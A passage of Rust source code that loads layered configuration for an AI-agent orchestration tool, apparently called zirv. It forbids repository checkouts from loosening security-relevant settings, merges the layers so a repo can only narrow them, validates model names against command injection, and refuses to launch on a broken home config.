    // `WorkerConfig`'s own doc comment. `value_at` matches a table node the
    // same way it matches a leaf (see `pace.use_credits`/`review` above), so
    // this one entry blocks both `worker.claude` and `worker.codex` together.
    (&["worker"], "ZIRV_CTX_WORKER_MODEL_CLAUDE"),
    // `handover.*` (issue #84): a repo checkout must not be able to pick
    // which model -- and so which vendor account -- the orchestrator seat
    // swaps onto via `zirv ctx handover`, the same trust asymmetry as
    // `agent`/`review.*`/`worker.*` above. `value_at` matches a table node
    // the same way it matches a leaf (see `pace.use_credits`/`review`/
    // `worker` above), so this one entry blocks the whole `[handover]`
    // table -- both agents, all three tiers -- together.
    (&["handover"], "ZIRV_CTX_HANDOVER_CLAUDE_CHEAP"),
    // `safety.allow`/`safety.default` (issue #83): unlike `safety.deny`/
    // `safety.ask` (lifted out and unioned across layers -- see
    // `super::safety`'s module doc, the identical narrowing-fold treatment
    // `sandbox.extra_deny` gets), adding an `allow` entry or changing the
    // unmatched-command `default` can only ever make the effective policy
    // *looser*, never stricter -- there is no narrowing reading of either,
    // so both are forbidden outright rather than folded, mirroring
    // `sandbox.extra_allow` right above.
    (&["safety", "allow"], "ZIRV_CTX_SAFETY_ALLOW"),
    // `safety.escape_allow` (issue #147): the same widening-only reasoning
    // as `safety.allow` right above, one narrower domain down -- it clears
    // a family for a `--dangerously-disable-sandbox` retry specifically, so
    // adding an entry can only ever loosen that gate, never narrow it.
    (&["safety", "escape_allow"], "ZIRV_CTX_SAFETY_ESCAPE_ALLOW"),
    (&["safety", "default"], "ZIRV_CTX_SAFETY_DEFAULT"),
    // `safety.interactive_default` (2026-08-24): the unmatched-command
    // verdict on an interactive launch, default `allow`. Same reasoning as
    // `safety.default` right above and then some -- `allow` is the loosest
    // verdict there is, so a checkout that could set it could silence every
    // prompt for the session it is checked out in.
    (
        &["safety", "interactive_default"],
        "ZIRV_CTX_SAFETY_INTERACTIVE_DEFAULT",
    ),
    // `safety.sql` (2026-08-24): same reasoning as the two `safety` keys
    // above. Turning the SQL classifier off removes an `Ask` it would
    // otherwise impose on a write statement reaching a broad allow rule or
    // the permissive interactive default -- loosening only.
    (&["safety", "sql"], "ZIRV_CTX_SAFETY_SQL"),
    // Issue #155, Phase 6b: a repo checkout must not be able to move when the
    // operator's own sessions rotate -- raising the ceiling (or the ratio
    // that derives it) hides rot from the operator for longer; lowering the
    // floor fires restarts, and the compaction/handoff they trigger, more
    // often than the operator chose. Both directions are the checkout
    // choosing spend/safety behavior for its own operator, the same trust
    // asymmetry every other entry in this list enforces. All five keys that
    // feed `rot::token_gates` are forbidden together, absolutes and ratios
    // alike, so a checkout cannot route around the absolute-override block by
    // tuning the ratio instead (or vice versa).
    (&["score", "token_floor"], "ZIRV_CTX_TOKEN_FLOOR"),
    (&["score", "token_ceiling"], "ZIRV_CTX_TOKEN_CEILING"),
    (
        &["score", "token_floor_ratio"],
        "ZIRV_CTX_SCORE_TOKEN_FLOOR_RATIO",
    ),
    (
        &["score", "token_ceiling_ratio"],
        "ZIRV_CTX_SCORE_TOKEN_CEILING_RATIO",
    ),
    (
        &["score", "model_context_tokens"],
        "ZIRV_CTX_SCORE_MODEL_CONTEXT_TOKENS",
    ),
    // Issue #264: a repo checkout must not be able to widen how long a price
    // table is presented as trustworthy, or point pricing at a file of its
    // own choosing -- see `PriceConfig`'s own doc comment.
    (
        &["price", "stale_after_days"],
        "ZIRV_CTX_PRICE_STALE_AFTER_DAYS",
    ),
    (&["price", "table_path"], "ZIRV_CTX_PRICE_TABLE_PATH"),
];

fn value_at<'a>(table: &'a toml::Table, path: &[&str]) -> Option<&'a toml::Value> {
    let (head, rest) = path.split_first()?;
    let value = table.get(*head)?;
    if rest.is_empty() {
        return Some(value);
    }
    value_at(value.as_table()?, rest)
}

/// Marker error for a `REPO_FORBIDDEN` rejection (`reject_untrusted_keys`),
/// distinct from every other way `CtxConfig::load` can fail (a bad env value,
/// an unknown/mistyped key, an unreadable file). A **security refusal**, not
/// a degrade-and-continue case like a layer that merely failed to parse (see
/// `UnparsableLayer`) -- callers that need to tell the two apart (`zirv ctx
/// status`'s exit code) use `is_repo_forbidden` rather than matching on the
/// message text.
#[derive(Debug)]
struct RepoForbiddenError(String);

impl std::fmt::Display for RepoForbiddenError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl std::error::Error for RepoForbiddenError {}

/// Whether `error` (as returned by `CtxConfig::load`) is a `REPO_FORBIDDEN`
/// rejection rather than any other load failure. `zirv ctx status` uses this
/// to decide its exit code: non-zero for a security refusal, zero for
/// everything else (including a skipped-unparsable layer, which is not even
/// an `Err` any more -- see `CtxConfig::load`'s own doc comment).
pub fn is_repo_forbidden(error: &(dyn std::error::Error + 'static)) -> bool {
    error.is::<RepoForbiddenError>()
}

/// Loud rather than silent: a repo that sets one of these gets a message
/// naming the key and where to put it, which beats wondering why the value in
/// the file is being ignored.
fn reject_untrusted_keys(layer: &toml::Table, path: &Path) -> CtxResult<()> {
    for (key, variable) in REPO_FORBIDDEN {
        if value_at(layer, key).is_some() {
            return Err(Box::new(RepoForbiddenError(format!(
                "{}: `{}` may not be set by a repository config, because it names something zirv \
                 then runs. Set it in ~/{}/{} or with {} instead.",
                path.display(),
                key.join("."),
                crate::utils::SCRIPT_DIR_NAME,
                CTX_CONFIG_FILE,
                variable
            ))));
        }
    }
    Ok(())
}

/// A `toml::de::Error`'s own `Display` renders a multi-line diagram (a
/// location line, a gutter, the offending source line, a caret, then the
/// message). `zirv ctx status`/the `zirv \u{25b8}` announcement both want one
/// line: the location (`"TOML parse error at line X, column Y"`, `Display`'s
/// own first line) plus `Error::message()`, which is exactly what an
/// operator needs to find and fix the byte without the diagram. Deliberately
/// does not include the path -- callers already have it (`UnparsableLayer::
/// path`) and show it separately.
fn summarize_parse_error(error: &toml::de::Error) -> String {
    let rendered = error.to_string();
    let first_line = rendered.lines().next().unwrap_or("TOML parse error");
    // `Display` only prints a location line when it actually has a span to
    // point at; without one (rare -- `toml::de::Error::custom` with no span)
    // the first line already *is* the message, and prefixing it with itself
    // would just repeat it.
    if first_line.starts_with("TOML parse error") {
        format!("{first_line}: {}", error.message())
    } else {
        error.message().to_string()
    }
}

/// Reads one config layer, merging it into `into` on success. Returns
/// `Ok(Some(_))`, not `Err`, when the file exists but fails to *parse* as
/// TOML: a syntax error in an untrusted layer (either one -- `~/.zirv/
/// ctx.toml` is operator-owned but still a hand-edited file a stray keystroke
/// can break) must not abort the whole load, only that layer. `into` is left
/// unchanged in that case, so the caller's merge sees nothing from it and
/// defaults/the other layer apply. An I/O error (unreadable file, permission
/// denied) is a different failure mode and still propagates via `?` -- this
/// only degrades a *parse* failure.
fn read_layer(
    path: &Path,
    into: &mut toml::Table,
    is_home: bool,
) -> CtxResult<Option<UnparsableLayer>> {
    if !path.exists() {
        return Ok(None);
    }
    let text = std::fs::read_to_string(path)?;
    match toml::from_str::<toml::Table>(&text) {
        Ok(layer) => {
            merge(into, layer);
            Ok(None)
        }
        Err(e) => Ok(Some(UnparsableLayer {
            path: path.to_path_buf(),
            message: summarize_parse_error(&e),
            is_home,
        })),
    }
}

impl CtxConfig {
    /// Layers `~/.zirv/ctx.toml`, then `<repo>/.zirv/ctx.toml`, then
    /// `ZIRV_CTX_*`. Flags are applied by each verb after loading.
    ///
    /// A layer that fails to *parse* as TOML (either one -- a stray keystroke
    /// in the untrusted repo file, or a hand-edit gone wrong in the
    /// operator's own home file) is skipped, not fatal: `read_layer` reports
    /// it as an `UnparsableLayer` instead of erroring, this function collects
    /// every one it sees into the returned config's own `unparsable_layers`,
    /// and the remaining layers plus defaults are used exactly as if the
    /// broken layer had never existed. Defaults are the safe posture
    /// (sandboxed, pacing on), so skipping a layer never *widens* anything --
    /// see the type's own doc comment. This is never silent: `load` announces
    /// once per process on the `zirv \u{25b8}` channel (`announce_unparsable_
    /// layers_once`), and `zirv ctx status`/`zirv ctx optimize` both surface
    /// the same list. A `REPO_FORBIDDEN` rejection is a different thing
    /// entirely -- a key that *did* parse but names something a repo may not
    /// set -- and still fails this call outright (see `is_repo_forbidden`).
    pub fn load(repo: &Path, env: EnvLookup<'_>) -> CtxResult<Self> {
        let mut merged = toml::Table::new();
        let mut unparsable_layers: Vec<UnparsableLayer> = Vec::new();

        if let Ok(home) = crate::utils::home_dir()
            && let Some(bad) = read_layer(
                &home
                    .join(crate::utils::SCRIPT_DIR_NAME)
                    .join(CTX_CONFIG_FILE),
                &mut merged,
                true,
            )?
        {
            unparsable_layers.push(bad);
        }
        // `[policy]` is lifted out of every layer before the deep merge: a
        // merge would let the repo layer's stance simply replace the
        // operator's, which is the one thing a permissions surface must never
        // allow. `policy::resolve` folds the same three layers with `max`
        // instead, so the repo half can only narrow.
        let home_policy = merged.remove(POLICY_SECTION);
        // `[safety]` (issue #83) gets the identical whole-section lift, for
        // the identical reason -- see `super::safety`'s module doc and the
        // `safety` field's own doc comment.
        let home_safety = merged.remove(SAFETY_SECTION);
        // `sandbox.extra_deny` gets the identical treatment, one level
        // deeper: a repo checkout may *add* deny entries (narrowing is
        // always safe), but the ordinary merge would let its array replace
        // the operator's home-layer one instead of adding to it. Resolved
        // as a union below, once both layers are in hand. `extra_allow`
        // needs no such lift: it is `REPO_FORBIDDEN` outright, so the repo
        // layer never has a value here for `merge()` to clobber anything
        // with.
        let home_extra_deny = string_array(take_nested(&mut merged, "sandbox", "extra_deny"));
        // T9 (repo-narrowing fold): `pace.enabled`/`max_percent`/`soft_percent`
        // get the identical treatment, for the identical reason -- lifted out
        // before the deep merge so a repo layer's value can never simply
        // replace the operator's. Unlike `sandbox.extra_deny`'s union, these
        // fold like `[policy]`'s own `Stance::max` (see `narrow_pace_bool`/
        // `narrow_pace_percent` below): the *stricter* of the two layers wins,
        // never the later one. `soft_percent`/`max_percent` share the same
        // rule (lower is stricter); `enabled` uses the bool-ordering
        // equivalent (`true` is stricter than `false`).
        let home_pace_enabled = bool_at(take_nested(&mut merged, "pace", "enabled"));
        let home_pace_max_percent = float_at(take_nested(&mut merged, "pace", "max_percent"));
        let home_pace_soft_percent = float_at(take_nested(&mut merged, "pace", "soft_percent"));
        // Issue #155, Phase 3: `context.dedupe_native` gets the identical
        // lift-before-merge treatment as `pace.enabled` right above, folded
        // by `narrow_dedupe_bool` instead of `narrow_pace_bool` -- see that
        // function's own doc comment for why the polarity is inverted.
        let home_context_dedupe_native =
            bool_at(take_nested(&mut merged, "context", "dedupe_native"));
        // Issue #309: `verify_on_stop.enabled`/`max_nudges` get the identical
        // lift-before-merge treatment -- see `narrow_verify_on_stop_enabled`/
        // `narrow_max_nudges` below for each field's strict direction.
        let home_verify_on_stop_enabled =
            bool_at(take_nested(&mut merged, "verify_on_stop", "enabled"));
        let home_verify_on_stop_max_nudges =
            integer_at(take_nested(&mut merged, "verify_on_stop", "max_nudges"));
        // `supervise.heavy_command_patterns` gets the identical treatment as
        // `sandbox.extra_deny` above, for the identical reason: the field's
        // own doc comment promises a repo layer may only ADD patterns, never
        // replace the operator's own list, but the ordinary `merge()` below
        // would let a repo `heavy_command_patterns = []` (or any other
        // array) silently clobber the home layer's entries instead of
        // adding to them. Lifted out and unioned once both layers are in
        // hand, same as `extra_deny`.
        let home_heavy_patterns = string_array(take_nested(
            &mut merged,
            "supervise",
            "heavy_command_patterns",
        ));

        // Issue #186: every fallback field is lifted before the repo merge.
        // The repo may only narrow automatic vendor steering; see the
        // re-insertion below for each field's strict direction.
        let home_fallback_enabled = bool_at(take_nested(&mut merged, "fallback", "enabled"));
        let home_fallback_order = string_array_at(take_nested(&mut merged, "fallback", "order"));
        let home_fallback_predictive = float_at(take_nested(
            &mut merged,
            "fallback",
            "predictive_headroom_pct",
        ));
        let home_fallback_min_candidate = float_at(take_nested(
            &mut merged,
            "fallback",
            "min_candidate_headroom_pct",
        ));
        let home_fallback_unknown =
            float_at(take_nested(&mut merged, "fallback", "unknown_headroom_pct"));
        let home_fallback_small_tokens = integer_at(take_nested(
            &mut merged,
            "fallback",
            "small_task_max_tokens",
        ));
        let home_fallback_small_tools = integer_at(take_nested(
            &mut merged,
            "fallback",
            "small_task_max_tool_calls",
        ));
        let home_deploy_tier = deploy_tier_at(
            take_nested3(&mut merged, "workflow", "deploy", "tier"),
            "workflow.deploy.tier",
        )?;
        let home_deploy_minimum = deploy_tier_at(
            take_nested3(&mut merged, "workflow", "deploy", "minimum_tier"),
            "workflow.deploy.minimum_tier",
        )?;

        // Read on its own first: the repo layer is the one layer that comes
        // from a checkout rather than from the operator.
        let repo_path = repo
            .join(crate::utils::SCRIPT_DIR_NAME)
            .join(CTX_CONFIG_FILE);
        let mut repo_layer = toml::Table::new();
        if let Some(bad) = read_layer(&repo_path, &mut repo_layer, false)? {
            unparsable_layers.push(bad);
        }
        // Before the lift, so a future `policy.*` entry in `REPO_FORBIDDEN`
        // still gets its loud rejection rather than being quietly folded.
        // Trivially satisfied when the repo layer above failed to parse:
        // `repo_layer` is empty in that case, so there is nothing here for it
        // to reject -- an unparsable repo file can name no forbidden key,
        // parsed or not.
        reject_untrusted_keys(&repo_layer, &repo_path)?;
        let repo_policy = repo_layer.remove(POLICY_SECTION);
        // Removed only after the rejection check above has already run, so a
        // repo file naming `safety.allow`/`safety.default` (both
        // `REPO_FORBIDDEN`) is still caught loudly here rather than being
        // silently dropped by this lift -- see `super::safety::resolve`'s
        // own doc comment for the defense-in-depth half of this guarantee.
        let repo_safety = repo_layer.remove(SAFETY_SECTION);
        let repo_extra_deny = string_array(take_nested(&mut repo_layer, "sandbox", "extra_deny"));
        let repo_pace_enabled = bool_at(take_nested(&mut repo_layer, "pace", "enabled"));
        let repo_pace_max_percent = float_at(take_nested(&mut repo_layer, "pace", "max_percent"));
        let repo_pace_soft_percent = float_at(take_nested(&mut repo_layer, "pace", "soft_percent"));
        let repo_context_dedupe_native =
            bool_at(take_nested(&mut repo_layer, "context", "dedupe_native"));
        let repo_verify_on_stop_enabled =
            bool_at(take_nested(&mut repo_layer, "verify_on_stop", "enabled"));
        let repo_verify_on_stop_max_nudges =
            integer_at(take_nested(&mut repo_layer, "verify_on_stop", "max_nudges"));
        let repo_heavy_patterns = string_array(take_nested(
            &mut repo_layer,
            "supervise",
            "heavy_command_patterns",
        ));
        let repo_fallback_enabled = bool_at(take_nested(&mut repo_layer, "fallback", "enabled"));
        let repo_fallback_order =
            string_array_at(take_nested(&mut repo_layer, "fallback", "order"));
        let repo_fallback_predictive = float_at(take_nested(
            &mut repo_layer,
            "fallback",
            "predictive_headroom_pct",
        ));
        let repo_fallback_min_candidate = float_at(take_nested(
            &mut repo_layer,
            "fallback",
            "min_candidate_headroom_pct",
        ));
        let repo_fallback_unknown = float_at(take_nested(
            &mut repo_layer,
            "fallback",
            "unknown_headroom_pct",
        ));
        let repo_fallback_small_tokens = integer_at(take_nested(
            &mut repo_layer,
            "fallback",
            "small_task_max_tokens",
        ));
        let repo_fallback_small_tools = integer_at(take_nested(
            &mut repo_layer,
            "fallback",
            "small_task_max_tool_calls",
        ));
        let repo_deploy_minimum = deploy_tier_at(
            take_nested3(&mut repo_layer, "workflow", "deploy", "minimum_tier"),
            "workflow.deploy.minimum_tier",
        )?;
        merge(&mut merged, repo_layer);

        let default_deploy = WorkflowDeployConfig::default();
        let declared_minimum = home_deploy_minimum.max(repo_deploy_minimum);
        let effective_deploy = home_deploy_tier
            .unwrap_or(default_deploy.tier)
            .max(declared_minimum.unwrap_or(default_deploy.tier));
        insert_path(
            &mut merged,
            &["workflow", "deploy", "tier"],
            toml::Value::String(effective_deploy.to_string()),
        );
        if let Some(minimum) = declared_minimum {
            insert_path(
                &mut merged,
                &["workflow", "deploy", "minimum_tier"],
                toml::Value::String(minimum.to_string()),
            );
        }

        // Re-inserted after the merge, before env: env (below) must still be
        // able to overwrite this outright, the same final-word precedence
        // every other key already gets.
        let default_pace = PaceConfig::default();
        insert_path(
            &mut merged,
            &["pace", "enabled"],
            toml::Value::Boolean(narrow_pace_bool(
                home_pace_enabled.unwrap_or(default_pace.enabled),
                repo_pace_enabled,
            )),
        );
        insert_path(
            &mut merged,
            &["pace", "max_percent"],
            toml::Value::Float(narrow_pace_percent(
                home_pace_max_percent.unwrap_or(default_pace.max_percent),
                repo_pace_max_percent,
            )),
        );
        insert_path(
            &mut merged,
            &["pace", "soft_percent"],
            toml::Value::Float(narrow_pace_percent(
                home_pace_soft_percent.unwrap_or(default_pace.soft_percent),
                repo_pace_soft_percent,
            )),
        );
        let default_context = ContextConfig::default();
        insert_path(
            &mut merged,
            &["context", "dedupe_native"],
            toml::Value::Boolean(narrow_dedupe_bool(
                home_context_dedupe_native.unwrap_or(default_context.dedupe_native),
                repo_context_dedupe_native,
            )),
        );
        let default_verify_on_stop = VerifyOnStopConfig::default();
        insert_path(
            &mut merged,
            &["verify_on_stop", "enabled"],
            toml::Value::Boolean(narrow_verify_on_stop_enabled(
                home_verify_on_stop_enabled.unwrap_or(default_verify_on_stop.enabled),
                repo_verify_on_stop_enabled,
            )),
        );
        let home_max_nudges = home_verify_on_stop_max_nudges
            .and_then(|v| u32::try_from(v).ok())
            .unwrap_or(default_verify_on_stop.max_nudges);
        let repo_max_nudges = repo_verify_on_stop_max_nudges.and_then(|v| u32::try_from(v).ok());
        insert_path(
            &mut merged,
            &["verify_on_stop", "max_nudges"],
            toml::Value::Integer(i64::from(narrow_max_nudges(
                home_max_nudges,
                repo_max_nudges,
            ))),
        );

        let default_fallback = FallbackConfig::default();
        let home_enabled = home_fallback_enabled.unwrap_or(default_fallback.enabled);
        insert_path(
            &mut merged,
            &["fallback", "enabled"],
            toml::Value::Boolean(home_enabled && repo_fallback_enabled.unwrap_or(true)),
        );
        let home_order = home_fallback_order.unwrap_or_else(|| default_fallback.order.clone());
        insert_path(
            &mut merged,
            &["fallback", "order"],
            toml::Value::Array(
                narrow_fallback_order(home_order, repo_fallback_order)
                    .into_iter()
                    .map(toml::Value::String)
                    .collect(),
            ),
        );
        insert_path(
            &mut merged,
            &["fallback", "predictive_headroom_pct"],
            toml::Value::Float(
                home_fallback_predictive
                    .unwrap_or(default_fallback.predictive_headroom_pct)
                    .min(repo_fallback_predictive.unwrap_or(f64::INFINITY)),
            ),
        );
        insert_path(
            &mut merged,
            &["fallback", "min_candidate_headroom_pct"],
            toml::Value::Float(
                home_fallback_min_candidate
                    .unwrap_or(default_fallback.min_candidate_headroom_pct)
                    .max(repo_fallback_min_candidate.unwrap_or(f64::NEG_INFINITY)),
            ),
        );
        insert_path(
            &mut merged,
            &["fallback", "unknown_headroom_pct"],
            toml::Value::Float(
                home_fallback_unknown
                    .unwrap_or(default_fallback.unknown_headroom_pct)
                    .min(repo_fallback_unknown.unwrap_or(f64::INFINITY)),
            ),
        );
        let home_small_tokens = home_fallback_small_tokens
            .and_then(|v| u64::try_from(v).ok())
            .unwrap_or(default_fallback.small_task_max_tokens);
        let repo_small_tokens = repo_fallback_small_tokens.and_then(|v| u64::try_from(v).ok());
        insert_path(
            &mut merged,
            &["fallback", "small_task_max_tokens"],
            toml::Value::Integer(
                home_small_tokens
                    .min(repo_small_tokens.unwrap_or(u64::MAX))
                    .try_into()
                    .unwrap_or(i64::MAX),
            ),
        );
        let home_small_tools = home_fallback_small_tools
            .and_then(|v| u32::try_from(v).ok())
            .unwrap_or(default_fallback.small_task_max_tool_calls);
        let repo_small_tools = repo_fallback_small_tools.and_then(|v| u32::try_from(v).ok());
        insert_path(
            &mut merged,
            &["fallback", "small_task_max_tool_calls"],
            toml::Value::Integer(i64::from(
                home_small_tools.min(repo_small_tools.unwrap_or(u32::MAX)),
            )),
        );

        for (var, path, kind) in ENV_MAP {
            if let Some(raw) = env(var) {
                let value = env_value(&raw, *kind).map_err(|e| format!("{var}: {e}"))?;
                insert_path(&mut merged, path, value);
            }
        }

        // Issue #155, Phase 5(e): `supervise.max_heavy_workers` is a
        // deprecated alias for `max_heavy_operations`, rewritten here --
        // after every layer, including the `ENV_MAP` loop just above, has
        // already contributed -- because `SuperviseConfig` is
        // `deny_unknown_fields` and an old key surviving to `try_into()`
        // below would hard-fail the load rather than degrade gracefully.
        // Positioned after `ENV_MAP` rather than alongside the `pace`/
        // `context` re-insertions above so the deprecated
        // `ZIRV_CTX_SUPERVISE_MAX_HEAVY_WORKERS` env var (still in
        // `ENV_MAP`, unchanged) gets the identical rewrite a deprecated TOML
        // key gets, instead of leaving its own stray `max_heavy_workers`
        // entry behind. The new key wins whenever both spellings ended up
        // set, regardless of which layer or env var supplied either one.
        if let Some(old) = take_nested(&mut merged, "supervise", "max_heavy_workers")
            && value_at(&merged, &["supervise", "max_heavy_operations"]).is_none()
        {
            insert_path(&mut merged, &["supervise", "max_heavy_operations"], old);
        }

        let mut cfg: Self = toml::Value::Table(merged)
            .try_into()
            .map_err(|e| format!("invalid ctx config: {e}"))?;

        if let Some(raw) = env("ZIRV_CTX_FALLBACK_ORDER") {
            cfg.fallback.order = split_csv_list(&raw);
        }
        for (key, value) in [
            (
                "fallback.predictive_headroom_pct",
                cfg.fallback.predictive_headroom_pct,
            ),
            (
                "fallback.min_candidate_headroom_pct",
                cfg.fallback.min_candidate_headroom_pct,
            ),
            (
                "fallback.unknown_headroom_pct",
                cfg.fallback.unknown_headroom_pct,
            ),
        ] {
            if !(0.0..=100.0).contains(&value) {
                return Err(format!("{key} must be between 0 and 100, got {value}").into());
            }
        }
        let mut seen = std::collections::HashSet::new();
        for name in &cfg.fallback.order {
            if !super::adapters::ADAPTERS
                .iter()
                .any(|(known, _)| known == name)
            {
                return Err(format!(
                    "fallback.order contains unknown agent '{name}'; known adapters: {}",
                    super::adapters::ADAPTERS
                        .iter()
                        .map(|(known, _)| *known)
                        .collect::<Vec<_>>()
                        .join(", ")
                )
                .into());
            }
            if !seen.insert(name.clone()) {
                return Err(format!("fallback.order contains duplicate agent '{name}'").into());
            }
        }

        // The union: the operator's own home-layer entries plus the repo's,
        // never fewer than either -- narrowing can only add restriction.
        // `ZIRV_CTX_SANDBOX_EXTRA_DENY`, when set, replaces this outright
        // (the operator's own final word, same as every other env escape
        // hatch), and `ZIRV_CTX_SANDBOX_EXTRA_ALLOW` replaces the plain
        // merged (operator-only, `REPO_FORBIDDEN`) `extra_allow` the same
        // way. Neither goes through `ENV_MAP`/`EnvKind`, which has no
        // list-shaped variant; both are simple comma-separated overrides.
        cfg.sandbox.extra_deny = match env("ZIRV_CTX_SANDBOX_EXTRA_DENY") {
            Some(raw) => split_csv_list(&raw),
            None => {
                let mut combined = home_extra_deny;
                combined.extend(repo_extra_deny);
                combined
            }
        };
        if let Some(raw) = env("ZIRV_CTX_SANDBOX_EXTRA_ALLOW") {
            cfg.sandbox.extra_allow = split_csv_list(&raw);
        }

        // Same operator-only override shape as `extra_allow` right above:
        // `dash.workdir_roots` is `REPO_FORBIDDEN` outright (see its own doc
        // comment), so there is no repo contribution to union in -- only the
        // operator's own home layer, or `ZIRV_CTX_DASH_WORKDIR_ROOTS`
        // replacing it outright when set.
        if let Some(raw) = env("ZIRV_CTX_DASH_WORKDIR_ROOTS") {
            cfg.dash.workdir_roots = split_csv_list(&raw);
        }

        // Same operator-only override shape as `extra_allow` right above:
        // when set, `ZIRV_CTX_WORKFLOW_CHECK_ENV_PASSTHROUGH` replaces
        // whatever `workflow.check_env_passthrough` the merged TOML layers
        // produced (`REPO_FORBIDDEN` already means that can only be the
        // operator's own `~/.zirv/ctx.toml`). This list is itself only ever
        // ADDED to `verification::DEFAULT_CHECK_ENV_PASSTHROUGH` at the
        // point of use, never a replacement for those built-in defaults.
        if let Some(raw) = env("ZIRV_CTX_WORKFLOW_CHECK_ENV_PASSTHROUGH") {
            cfg.workflow.check_env_passthrough = split_csv_list(&raw);
        }

        // Same union as `extra_deny` above, for `heavy_command_patterns`: the
        // operator's own home-layer patterns plus whatever the repo adds,
        // never fewer than either -- a repo layer may only add a pattern
        // (narrowing), never remove or replace the operator's own list. No
        // env override exists for this key today, unlike `extra_deny`/
        // `extra_allow`.
        let mut heavy_patterns = home_heavy_patterns;
        heavy_patterns.extend(repo_heavy_patterns);
        cfg.supervise.heavy_command_patterns = heavy_patterns;

        // SECURITY (command-injection defense): `chat.model` is one of the few
        // keys a repo `ctx.toml` may set (see `REPO_FORBIDDEN`'s `chat.model`
        // note), and it is appended to an interactive launch's argv via
        // `AgentAdapter::model_args`. On Windows an npm-installed agent resolves
        // to a `.cmd` shim that zirv routes through `cmd.exe /c`, which
        // re-parses that argv -- so an unconstrained model string is a repo-
        // controlled path into a shell command line. Constrain it to a charset
        // that cannot express any shell/cmd metacharacter (space, quote,
        // `& | ^ < > ( ) % ! ` backtick, newline are all excluded), so the
        // repo-settable exemption cannot carry a payload. `:` `/` `@` are kept
        // so Bedrock/Vertex ids (`us.anthropic.claude-...-v1:0`,
        // `claude-...@20250101`) stay valid. The `ZIRV_CTX_CHAT_MODEL` env path
        // merged above is validated identically, since it merges before here,
        // and every downstream surface (banner, dashboard header, `model_args`)
        // reads the value only after this point.
        if let Some(model) = cfg.chat.model.as_deref() {
            validate_model_str("chat.model", model)?;
        }

        // `review.claude`/`review.codex` land in injected prompt text (see
        // `review_roster_line` in `adapters/mod.rs`, the harness-roster line
        // an Orchestrator session's own base prompt reads), not in argv
        // directly -- but that session may itself later re-type the value
        // onto a real command line (e.g. `zirv agent <name> ...`), so the
        // same charset/length/leading-dash guard is defense for both: the
        // prompt-injection surface today, and the argv it may be re-typed
        // onto tomorrow. `REPO_FORBIDDEN` (see its own comment on the
        // `review` entry) is what keeps a checked-out repo from setting
        // these at all; this is the second, independent layer that bounds
        // what even an operator's own value can carry.
        if let Some(model) = cfg.review.claude.as_deref() {
            validate_model_str("review.claude", model)?;
        }
        if let Some(model) = cfg.review.codex.as_deref() {
            validate_model_str("review.codex", model)?;
        }

        // `worker.claude`/`worker.codex` reach a real launch argv directly
        // (`adapters::worker_model_args` -> `AgentAdapter::model_args`), an
        // even more direct path than `review.*`'s own prompt-text injection
        // above, so the same guard applies.
        if let Some(model) = cfg.worker.claude.as_deref() {
            validate_model_str("worker.claude", model)?;
        }
        if let Some(model) = cfg.worker.codex.as_deref() {
            validate_model_str("worker.codex", model)?;
        }

        // `handover.<agent>.<tier>` reach a real launch argv directly too
        // (`handover::resolve_swap_launch` -> `AgentAdapter::model_args`),
        // the same path `worker.claude`/`worker.codex` take, so the same
        // guard applies to all six leaves.
        if let Some(model) = cfg.handover.claude.cheap.as_deref() {
            validate_model_str("handover.claude.cheap", model)?;
        }
        if let Some(model) = cfg.handover.claude.standard.as_deref() {
            validate_model_str("handover.claude.standard", model)?;
        }
        if let Some(model) = cfg.handover.claude.deep.as_deref() {
            validate_model_str("handover.claude.deep", model)?;
        }
        if let Some(model) = cfg.handover.codex.cheap.as_deref() {
            validate_model_str("handover.codex.cheap", model)?;
        }
        if let Some(model) = cfg.handover.codex.standard.as_deref() {
            validate_model_str("handover.codex.standard", model)?;
        }
        if let Some(model) = cfg.handover.codex.deep.as_deref() {
            validate_model_str("handover.codex.deep", model)?;
        }

        cfg.agents = crate::settings::AgentGate::load(repo, env)?;
        cfg.policy = super::policy::resolve(home_policy, repo_policy, env)?;
        cfg.safety = super::safety::resolve(home_safety, repo_safety, env)?;
        cfg.unparsable_layers = unparsable_layers;
        announce_unparsable_layers_once(&cfg);
        Ok(cfg)
    }

    /// `load`, plus a refusal a plain `load` deliberately does not make: a
    /// verb that is about to launch or supervise a harness (`chat`, `wrap`,
    /// `exec`, `loop`, `agent`, `handover`, and `dash`'s pane spawns, which
    /// all route through `wrap::run_with`) must not silently fall back to
    /// permissive `[pace]`/`[policy]`/`[sandbox]` defaults just because the
    /// operator's own `~/.zirv/ctx.toml` has a syntax error. A REPO-layer
    /// parse failure is still skipped exactly as `load` does -- that file is
    /// untrusted, user-reported input, and skipping it can only ever narrow
    /// (defaults are the safe posture) or leave the operator's own stricter
    /// home settings in force. Read-only/diagnostic verbs (`status`,
    /// `optimize`, `safety list`/`explain`, and everything else that never
    /// spawns a harness) call `load` directly and keep reporting a broken
    /// home layer inline rather than refusing -- see each call site.
    pub fn load_for_launch(repo: &Path, env: EnvLookup<'_>) -> CtxResult<Self> {
        let cfg = Self::load(repo, env)?;
        if let Some(layer) = cfg.unparsable_layers.iter().find(|l| l.is_home) {
            return Err(format!(
                "{}: {}\nThis is your own home config (~/{}/{}), not the repo's -- fix the \
                 syntax error above, or remove the file to fall back to defaults. Refusing to \
                 launch rather than silently dropping back to permissive pacing/policy/sandbox \
                 defaults.",
                layer.path.display(),
                layer.message,
                crate::utils::SCRIPT_DIR_NAME,
                CTX_CONFIG_FILE,
            )
            .into());
        }
        Ok(cfg)
    }
}

/// Emits [`super::announce::Event::ConfigUnparsable`] on the `zirv \u{25b8}`
/// channel, exactly once per process and only when the operator has not
/// opted out (`cfg.chrome.events`) -- the same latch discipline `poll.rs`'s
/// `announce_keychain_prompt_once` uses, applied here as a process-wide
/// `AtomicBool` for the same reason: `CtxConfig::load` has no per-run state
/// of its own to carry a flag in, and it is called from dozens of call sites
/// across one process. A no-op when `cfg.unparsable_layers` is empty, so
/// every ordinary `load` call pays only the one cheap check.
fn announce_unparsable_layers_once(cfg: &CtxConfig) {
    if cfg.unparsable_layers.is_empty() || !cfg.chrome.events {
        return;
    }
    static ANNOUNCED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
    let already_announced = ANNOUNCED
        .compare_exchange(
            false,
            true,
            std::sync::atomic::Ordering::SeqCst,
            std::sync::atomic::Ordering::SeqCst,
        )
        .is_err();
    if already_announced {
        return;
    }
    let detail = cfg
        .unparsable_layers
        .iter()
        .map(|layer| format!("{}: {}", layer.path.display(), layer.message))
